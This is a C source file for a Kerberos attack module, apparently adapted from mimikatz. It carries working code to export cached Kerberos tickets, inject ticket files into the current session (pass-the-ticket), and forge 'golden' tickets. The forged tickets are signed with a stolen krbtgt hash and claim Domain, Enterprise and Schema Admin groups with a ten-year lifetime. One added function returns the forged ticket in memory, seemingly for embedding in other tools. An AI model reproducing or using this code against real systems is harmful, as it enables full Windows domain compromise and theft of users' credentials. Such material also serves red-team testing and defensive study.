/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "khul_m_kerberos.h"
#include "khul_m_kerberos_pac.h"
#include "khul_m_kerberos_ticket.h"

STRING	kerberosPackageName = {8, 9, MICROSOFT_KERBEROS_NAME_A};
DWORD	g_AuthenticationPackageId_Kerberos = 0;
BOOL	g_isAuthPackageKerberos = FALSE;
HANDLE	g_hLSA = NULL;

const KUHL_M_C kuhl_m_c_kerberos[] = {
	{kuhl_m_kerberos_ptt,		L"ptt",			L"Pass-the-ticket [NT 6]"},
	{kuhl_m_kerberos_list,		L"list",		L"List ticket(s)"},
	{kuhl_m_kerberos_tgt,		L"tgt",			L"Retrieve the current TGT"},
	{kuhl_m_kerberos_purge,		L"purge",		L"Purge ticket(s)"},
	{kuhl_m_kerberos_golden,	L"golden",		L"Willy Wonka factory"},
};

const KUHL_M kuhl_m_kerberos = {
	L"kerberos",	L"Kerberos package module",	L"",
	sizeof(kuhl_m_c_kerberos) / sizeof(KUHL_M_C), kuhl_m_c_kerberos, kuhl_m_kerberos_init, kuhl_m_kerberos_clean
};

NTSTATUS kuhl_m_kerberos_init()
{
	NTSTATUS status = LsaConnectUntrusted(&g_hLSA);
	if(NT_SUCCESS(status))
	{
		status = LsaLookupAuthenticationPackage(g_hLSA, &kerberosPackageName, &g_AuthenticationPackageId_Kerberos);
		g_isAuthPackageKerberos = NT_SUCCESS(status);
	}
	return status;
}

NTSTATUS kuhl_m_kerberos_clean()
{
	return LsaDeregisterLogonProcess(g_hLSA);
}

NTSTATUS LsaCallKerberosPackage(PVOID ProtocolSubmitBuffer, ULONG SubmitBufferLength, PVOID *ProtocolReturnBuffer, PULONG ReturnBufferLength, PNTSTATUS ProtocolStatus)
{
	NTSTATUS status = STATUS_HANDLE_NO_LONGER_VALID;
	if(g_hLSA && g_isAuthPackageKerberos)
		status = LsaCallAuthenticationPackage(g_hLSA, g_AuthenticationPackageId_Kerberos, ProtocolSubmitBuffer, SubmitBufferLength, ProtocolReturnBuffer, ReturnBufferLength, ProtocolStatus);
	return status;
}

LONG kuhl_m_kerberos_use_ticket(PBYTE fileData, DWORD fileSize)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	NTSTATUS packageStatus;
	DWORD submitSize, responseSize;
	PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
	PVOID dumPtr;

	submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + fileSize;
	if(pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST) LocalAlloc(LPTR, submitSize))
	{
		pKerbSubmit->MessageType = KerbSubmitTicketMessage;
		pKerbSubmit->KerbCredSize = fileSize;
		pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
		RtlCopyMemory((PBYTE) pKerbSubmit + pKerbSubmit->KerbCredOffset, fileData, pKerbSubmit->KerbCredSize);

		status = LsaCallKerberosPackage(pKerbSubmit, submitSize, &dumPtr, &responseSize, &packageStatus);
		if(NT_SUCCESS(status))
		{
			if (NT_SUCCESS(packageStatus))
			{
				kprintf(L"Ticket successfully submitted for current session\n");
				status = STATUS_SUCCESS;
			}
			else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbSubmitTicketMessage / Package : %08x\n", packageStatus);
		}
		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbSubmitTicketMessage : %08x\n", status);

		LocalFree(pKerbSubmit);
	}

	return status;
}

NTSTATUS kuhl_m_kerberos_ptt(int argc, wchar_t * argv[])
{
	NTSTATUS status, packageStatus;
	PBYTE fileData;
	DWORD fileSize, submitSize, responseSize;
	PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
	PVOID dumPtr;

	if(argc)
	{
		if(kull_m_file_readData(argv[argc - 1], &fileData, &fileSize))
		{
			submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + fileSize;
			if(pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST) LocalAlloc(LPTR, submitSize))
			{
				pKerbSubmit->MessageType = KerbSubmitTicketMessage;
				pKerbSubmit->KerbCredSize = fileSize;
				pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
				RtlCopyMemory((PBYTE) pKerbSubmit + pKerbSubmit->KerbCredOffset, fileData, pKerbSubmit->KerbCredSize);

				status = LsaCallKerberosPackage(pKerbSubmit, submitSize, &dumPtr, &responseSize, &packageStatus);
				if(NT_SUCCESS(status))
				{
					if(NT_SUCCESS(packageStatus))
						kprintf(L"Ticket \'%s\' successfully submitted for current session\n", argv[0]);
					else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbSubmitTicketMessage / Package : %08x\n", packageStatus);
				}
				else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbSubmitTicketMessage : %08x\n", status);

				LocalFree(pKerbSubmit);
			}
			LocalFree(fileData);
		}
		else PRINT_ERROR_AUTO(L"kull_m_file_readData");
	} else PRINT_ERROR(L"Missing argument : ticket filename\n");

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kerberos_purge(int argc, wchar_t * argv[])
{
	NTSTATUS status, packageStatus;
	KERB_PURGE_TKT_CACHE_REQUEST kerbPurgeRequest = {KerbPurgeTicketCacheMessage, {0, 0}, {0, 0, NULL}, {0, 0, NULL}};
	PVOID dumPtr;
	DWORD responseSize;

	status = LsaCallKerberosPackage(&kerbPurgeRequest, sizeof(KERB_PURGE_TKT_CACHE_REQUEST), &dumPtr, &responseSize, &packageStatus);
	if(NT_SUCCESS(status))
	{
		if(NT_SUCCESS(packageStatus))
			kprintf(L"Ticket(s) purge for current session is OK\n", argv[0]);
		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbPurgeTicketCacheMessage / Package : %08x\n", packageStatus);
	}
	else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbPurgeTicketCacheMessage : %08x\n", status);

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kerberos_tgt(int argc, wchar_t * argv[])
{
	NTSTATUS status, packageStatus;
	KERB_RETRIEVE_TKT_REQUEST kerbRetrieveRequest = {KerbRetrieveTicketMessage, {0, 0}, {0, 0, NULL}, 0, 0, KERB_ETYPE_NULL, {0, 0}};
	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
	DWORD szData;
	KIWI_KERBEROS_TICKET kiwiTicket = {0};
	
	status = LsaCallKerberosPackage(&kerbRetrieveRequest, sizeof(KERB_RETRIEVE_TKT_REQUEST), (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
	kprintf(L"Keberos TGT of current session : ");
	if(NT_SUCCESS(status))
	{
		if(NT_SUCCESS(packageStatus))
		{
			kiwiTicket.ServiceName = pKerbRetrieveResponse->Ticket.ServiceName;
			kiwiTicket.TargetName = pKerbRetrieveResponse->Ticket.TargetName;
			kiwiTicket.ClientName = pKerbRetrieveResponse->Ticket.ClientName;
			kiwiTicket.DomainName = pKerbRetrieveResponse->Ticket.DomainName;
			kiwiTicket.TargetDomainName = pKerbRetrieveResponse->Ticket.TargetDomainName;
			kiwiTicket.AltTargetDomainName = pKerbRetrieveResponse->Ticket.AltTargetDomainName;
			kiwiTicket.TicketFlags = pKerbRetrieveResponse->Ticket.TicketFlags;
			kiwiTicket.KeyType = kiwiTicket.TicketEncType = pKerbRetrieveResponse->Ticket.SessionKey.KeyType; // TicketEncType not in response
			kiwiTicket.Key.Length = pKerbRetrieveResponse->Ticket.SessionKey.Length;
			kiwiTicket.Key.Value = pKerbRetrieveResponse->Ticket.SessionKey.Value;
			kiwiTicket.StartTime = *(PFILETIME) &pKerbRetrieveResponse->Ticket.StartTime;
			kiwiTicket.EndTime = *(PFILETIME) &pKerbRetrieveResponse->Ticket.EndTime;
			kiwiTicket.RenewUntil = *(PFILETIME) &pKerbRetrieveResponse->Ticket.RenewUntil;
			kiwiTicket.Ticket.Length = pKerbRetrieveResponse->Ticket.EncodedTicketSize;
			kiwiTicket.Ticket.Value = pKerbRetrieveResponse->Ticket.EncodedTicket;
			kuhl_m_kerberos_ticket_display(&kiwiTicket, FALSE);
			kprintf(L"\n(NULL session key means allowtgtsessionkey is not set to 1)\n");
			LsaFreeReturnBuffer(pKerbRetrieveResponse);
		}
		else if(packageStatus == SEC_E_NO_CREDENTIALS)
			kprintf(L"no ticket !\n");
		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveTicketMessage / Package : %08x\n", packageStatus);
	}
	else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveTicketMessage : %08x\n", status);

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kerberos_list(int argc, wchar_t * argv[])
{
	NTSTATUS status, packageStatus;
	KERB_QUERY_TKT_CACHE_REQUEST kerbCacheRequest = {KerbQueryTicketCacheExMessage, {0, 0}};
	PKERB_QUERY_TKT_CACHE_EX_RESPONSE pKerbCacheResponse;
	PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
	DWORD szData, i, j;
	wchar_t * filename;
	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);

	status = LsaCallKerberosPackage(&kerbCacheRequest, sizeof(KERB_QUERY_TKT_CACHE_REQUEST), (PVOID *) &pKerbCacheResponse, &szData, &packageStatus);
	if(NT_SUCCESS(status))
	{
		if(NT_SUCCESS(packageStatus))
		{
			for(i = 0; i < pKerbCacheResponse->CountOfTickets; i++)
			{
				kprintf(L"\n[%08x] - %02x", i, pKerbCacheResponse->Tickets[i].EncryptionType);
				kprintf(L"\n   Start/End/MaxRenew: ");
				kull_m_string_displayLocalFileTime((PFILETIME) &pKerbCacheResponse->Tickets[i].StartTime); kprintf(L" ; ");
				kull_m_string_displayLocalFileTime((PFILETIME) &pKerbCacheResponse->Tickets[i].EndTime); kprintf(L" ; ");
				kull_m_string_displayLocalFileTime((PFILETIME) &pKerbCacheResponse->Tickets[i].RenewTime);
				kprintf(L"\n   Server Name       : %wZ @ %wZ", &pKerbCacheResponse->Tickets[i].ServerName, &pKerbCacheResponse->Tickets[i].ServerRealm);
				kprintf(L"\n   Client Name       : %wZ @ %wZ", &pKerbCacheResponse->Tickets[i].ClientName, &pKerbCacheResponse->Tickets[i].ClientRealm);
				kprintf(L"\n   Flags %08x    : ", pKerbCacheResponse->Tickets[i].TicketFlags);
				for(j = 0; j < 16; j++)
					if((pKerbCacheResponse->Tickets[i].TicketFlags >> (j + 16)) & 1)
						kprintf(L"%s ; ", TicketFlagsToStrings[j]);
			
				if(export)
				{
					szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + pKerbCacheResponse->Tickets[i].ServerName.MaximumLength;
					if(pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST) LocalAlloc(LPTR, szData)) // LPTR implicates KERB_ETYPE_NULL
					{
						pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
						pKerbRetrieveRequest->CacheOptions = /*KERB_RETRIEVE_TICKET_USE_CACHE_ONLY | */KERB_RETRIEVE_TICKET_AS_KERB_CRED;
						pKerbRetrieveRequest->TicketFlags = pKerbCacheResponse->Tickets[i].TicketFlags;
						pKerbRetrieveRequest->TargetName = pKerbCacheResponse->Tickets[i].ServerName;
						pKerbRetrieveRequest->TargetName.Buffer = (PWSTR) ((PBYTE) pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
						RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, pKerbCacheResponse->Tickets[i].ServerName.Buffer, pKerbRetrieveRequest->TargetName.MaximumLength);

						status = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
						if(NT_SUCCESS(status))
						{
							if(NT_SUCCESS(packageStatus))
							{
								if(filename = kuhl_m_kerberos_generateFileName(i, &pKerbCacheResponse->Tickets[i], MIMIKATZ_KERBEROS_EXT))
								{
									if(kull_m_file_writeData(filename, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
										kprintf(L"\n   * Saved to file     : %s", filename);
									LocalFree(filename);
								}
								LsaFreeReturnBuffer(pKerbRetrieveResponse);
							}
							else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
						}
						else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : %08x\n", status);

						LocalFree(pKerbRetrieveRequest);
					}
				}
				kprintf(L"\n");
			}
			LsaFreeReturnBuffer(pKerbCacheResponse);
		}
		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbQueryTicketCacheEx2Message / Package : %08x\n", packageStatus);
	}
	else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbQueryTicketCacheEx2Message : %08x\n", status);

	return STATUS_SUCCESS;
}

wchar_t * kuhl_m_kerberos_generateFileName(const DWORD index, PKERB_TICKET_CACHE_INFO_EX ticket, LPCWSTR ext)
{
	wchar_t * buffer;
	size_t charCount = 0x1000;
	
	if(buffer = (wchar_t *) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
	{
		if(swprintf_s(buffer, charCount, L"%u-%08x-%wZ@%wZ-%wZ.%s", index, ticket->TicketFlags, &ticket->ClientName, &ticket->ServerName, &ticket->ServerRealm, ext) > 0)
			kull_m_file_cleanFilename(buffer);
		else
			buffer = (wchar_t *) LocalFree(buffer);
	}
	return buffer;
}

LONG kuhl_m_kerberos_create_golden_ticket(PCWCHAR szUser, PCWCHAR szDomain, PCWCHAR szSid, PCWCHAR szNtlm, PBYTE* ticketBuffer, DWORD* ticketBufferSize)
{
	BYTE ntlm[LM_NTLM_HASH_LENGTH] = {0};
	DWORD i, j;
	PISID pSid = NULL;
	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;
	NTSTATUS result = STATUS_UNSUCCESSFUL;

	PRINT_ERROR(L"User: %s", szUser);
	PRINT_ERROR(L"Domain: %s", szDomain);
	PRINT_ERROR(L"Sid: %s", szSid);
	PRINT_ERROR(L"Ntlm: %s", szNtlm);

	if(ConvertStringSidToSid(szSid, (PSID *) &pSid))
	{
		if(wcslen(szNtlm) == (LM_NTLM_HASH_LENGTH * 2))
		{
			for(i = 0; i < LM_NTLM_HASH_LENGTH; i++)
			{
				swscanf_s(&szNtlm[i*2], L"%02x", &j);
				ntlm[i] = (BYTE) j;
			}
			kprintf(
				L"Admin  : %s\n"
				L"Domain : %s\n"
				L"SID    : %s\n"
				L"krbtgt : ",
				szUser, szDomain, szSid);
			kull_m_string_wprintf_hex(ntlm, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");

			if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, pSid, ntlm))
			{
				*ticketBufferSize = kull_m_asn1_getSize(App_KrbCred);
				*ticketBuffer = (BYTE*)malloc(*ticketBufferSize);
				if (*ticketBuffer != NULL)
				{
					memcpy(*ticketBuffer, (PBYTE)App_KrbCred, *ticketBufferSize);
					kprintf(L"\nFinal Ticket retrieved!\n");
					result = STATUS_SUCCESS;
				}
				else PRINT_ERROR_AUTO(L"\nkull_m_file_writeData");
			}
			else PRINT_ERROR(L"KrbCred error\n");
		}
		else PRINT_ERROR(L"Krbtgt key size length must be 32 (16 bytes)\n");
	}
	else PRINT_ERROR_AUTO(L"SID seems invalid - ConvertStringSidToSid");

	if (pSid)
	{
		LocalFree(pSid);
	}

	return result;
}

NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
{
	BYTE ntlm[LM_NTLM_HASH_LENGTH] = {0};
	DWORD i, j;
	PCWCHAR szUser, szDomain, szSid, szNtlm, filename;
	PISID pSid;
	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;

	kull_m_string_args_byName(argc, argv, L"ticket", &filename, L"ticket.kirbi");

	if(kull_m_string_args_byName(argc, argv, L"admin", &szUser, NULL))
	{
		if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
		{
			if(kull_m_string_args_byName(argc, argv, L"sid", &szSid, NULL))
			{
				if(ConvertStringSidToSid(szSid, (PSID *) &pSid))
				{
					if(kull_m_string_args_byName(argc, argv, L"krbtgt", &szNtlm, NULL))
					{
						if(wcslen(szNtlm) == (LM_NTLM_HASH_LENGTH * 2))
						{
							for(i = 0; i < LM_NTLM_HASH_LENGTH; i++)
							{
								swscanf_s(&szNtlm[i*2], L"%02x", &j);
								ntlm[i] = (BYTE) j;
							}
							kprintf(
								L"Admin  : %s\n"
								L"Domain : %s\n"
								L"SID    : %s\n"
								L"krbtgt : ",
								szUser, szDomain, szSid);
							kull_m_string_wprintf_hex(ntlm, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
							kprintf(L"Ticket : %s\n\n", filename);

							if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, pSid, ntlm))
							{
								if(kull_m_file_writeData(filename, (PBYTE) App_KrbCred, kull_m_asn1_getSize(App_KrbCred)))
									kprintf(L"\nFinal Ticket Saved to file !\n");
								else PRINT_ERROR_AUTO(L"\nkull_m_file_writeData");
							}
							else PRINT_ERROR(L"KrbCred error\n");
						}
						else PRINT_ERROR(L"Krbtgt key size length must be 32 (16 bytes)\n");
					}
					else PRINT_ERROR(L"Missing krbtgt argument\n");

					LocalFree(pSid);
				}
				else PRINT_ERROR_AUTO(L"SID seems invalid - ConvertStringSidToSid");
			}
			else PRINT_ERROR(L"Missing SID argument\n");
		}
		else PRINT_ERROR(L"Missing domain argument\n");
	}
	else PRINT_ERROR(L"Missing admin argument\n");

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD keySize, LPCVOID data, DWORD dataSize, LPVOID * output, DWORD * outputSize, BOOL encrypt)
{
	NTSTATUS status;
	PKERB_ECRYPT pCSystem;
	PVOID pContext;
	DWORD bufferSize;

	status = kullCDLocateCSystem(eType, &pCSystem);
	if(NT_SUCCESS(status))
	{
		status = pCSystem->Initialize(key, keySize, keyUsage, &pContext);
		if(NT_SUCCESS(status))
		{
			bufferSize = encrypt ? (dataSize + pCSystem->Size) : (dataSize /*- pCSystem->Size*/);
			if(*output = LocalAlloc(LPTR, bufferSize))
			{
				status = encrypt ? pCSystem->Encrypt(pContext, data, dataSize, *output, outputSize) : pCSystem->Decrypt(pContext, data, dataSize, *output, outputSize);
				if(!NT_SUCCESS(status))
					LocalFree(*output);
			}
			pCSystem->Finish(&pContext);
		}
	}
	return status;
}

PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, PISID sid, LPCBYTE krbtgt)
{
	NTSTATUS status;
	PDIRTY_ASN1_SEQUENCE_EASY App_EncTicketPart, App_KrbCred = NULL;
	KIWI_KERBEROS_TICKET ticket = {0};
	KERB_VALIDATION_INFO validationInfo = {0};
	SYSTEMTIME st;
	PPACTYPE pacType; DWORD pacTypeSize;
	GROUP_MEMBERSHIP groups[] = {{513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAULT_GROUP_ATTRIBUTES}, {520, DEFAULT_GROUP_ATTRIBUTES}, {518, DEFAULT_GROUP_ATTRIBUTES}, {519, DEFAULT_GROUP_ATTRIBUTES},};
	ULONG userid = 500;

	GetSystemTime(&st); st.wMilliseconds = 0;

	if(ticket.ClientName = (PKERB_EXTERNAL_NAME) LocalAlloc(LPTR, sizeof(KERB_EXTERNAL_NAME) /* 1 UNICODE into */))
	{
		ticket.ClientName->NameCount = 1;
		ticket.ClientName->NameType = KRB_NT_PRINCIPAL;
		RtlInitUnicodeString(&ticket.ClientName->Names[0], username);
	}
	if(ticket.ServiceName = (PKERB_EXTERNAL_NAME) LocalAlloc(LPTR, sizeof(KERB_EXTERNAL_NAME) /* 1 UNICODE into */+ sizeof(UNICODE_STRING)))
	{
		ticket.ServiceName->NameCount = 2;
		ticket.ServiceName->NameType = KRB_NT_SRV_INST;
		RtlInitUnicodeString(&ticket.ServiceName->Names[0],	L"krbtgt");
		RtlInitUnicodeString(&ticket.ServiceName->Names[1], domainname);
	}
	ticket.DomainName = ticket.TargetDomainName = ticket.AltTargetDomainName = ticket.ServiceName->Names[1];

	ticket.TicketFlags = KERB_TICKET_FLAGS_initial | KERB_TICKET_FLAGS_pre_authent | KERB_TICKET_FLAGS_renewable | KERB_TICKET_FLAGS_forwardable;
	ticket.TicketKvno = 2; // windows does not care about it...
	ticket.TicketEncType = ticket.KeyType = KERB_ETYPE_RC4_HMAC_NT;
	ticket.Key.Length = 16;
	if(ticket.Key.Value = (PUCHAR) LocalAlloc(LPTR, ticket.Key.Length))
		kullRtlGenRandom(ticket.Key.Value, ticket.Key.Length);
		
	SystemTimeToFileTime(&st, &ticket.StartTime);
	st.wYear += 10;
	SystemTimeToFileTime(&st, &ticket.EndTime);
	st.wYear += 10; // just for lulz
	SystemTimeToFileTime(&st, &ticket.RenewUntil);
		
	validationInfo.LogonTime = ticket.StartTime;
	KIWI_NEVERTIME(&validationInfo.LogoffTime);
	KIWI_NEVERTIME(&validationInfo.KickOffTime);
	KIWI_NEVERTIME(&validationInfo.PasswordLastSet);
	KIWI_NEVERTIME(&validationInfo.PasswordCanChange);
	KIWI_NEVERTIME(&validationInfo.PasswordMustChange);

	validationInfo.EffectiveName		= ticket.ClientName->Names[0];
	validationInfo.LogonDomainId		= sid;
	validationInfo.UserId				= userid;
	validationInfo.UserAccountControl	= USER_DONT_EXPIRE_PASSWORD | USER_NORMAL_ACCOUNT;
	validationInfo.PrimaryGroupId		= groups[0].RelativeId;

	validationInfo.GroupCount = sizeof(groups) / sizeof(GROUP_MEMBERSHIP);
	validationInfo.GroupIds = groups;
	
	if(kuhl_m_pac_validationInfo_to_PAC(&validationInfo, &pacType, &pacTypeSize))
	{
		kprintf(L" * PAC generated\n");
		status = kuhl_m_pac_signature(pacType, pacTypeSize, krbtgt, LM_NTLM_HASH_LENGTH);
		if(NT_SUCCESS(status))
		{
			kprintf(L" * PAC signed\n");
			if(App_EncTicketPart = kuhl_m_kerberos_ticket_createAppEncTicketPart(&ticket, pacType, pacTypeSize))
			{
				kprintf(L" * EncTicketPart generated\n");
				status = kuhl_m_kerberos_encrypt(ticket.TicketEncType, KRB_KEY_USAGE_AS_REP_TGS_REP, krbtgt, LM_NTLM_HASH_LENGTH, App_EncTicketPart, kull_m_asn1_getSize(App_EncTicketPart), (LPVOID *) &ticket.Ticket.Value, &ticket.Ticket.Length, TRUE);	
				if(NT_SUCCESS(status))
				{
					kprintf(L" * EncTicketPart encrypted\n");
					if(App_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(&ticket))
						kprintf(L" * KrbCred generated\n");
				}
				else PRINT_ERROR(L"kuhl_m_kerberos_encrypt %08x\n", status);
				LocalFree(App_EncTicketPart);
			}
		}
		LocalFree(pacType);
	}
	
	if(ticket.Ticket.Value)
		LocalFree(ticket.Ticket.Value);
	if(ticket.ClientName)
		LocalFree(ticket.ClientName);
	if(ticket.ServiceName)
		LocalFree(ticket.ServiceName);

	return App_KrbCred;
}
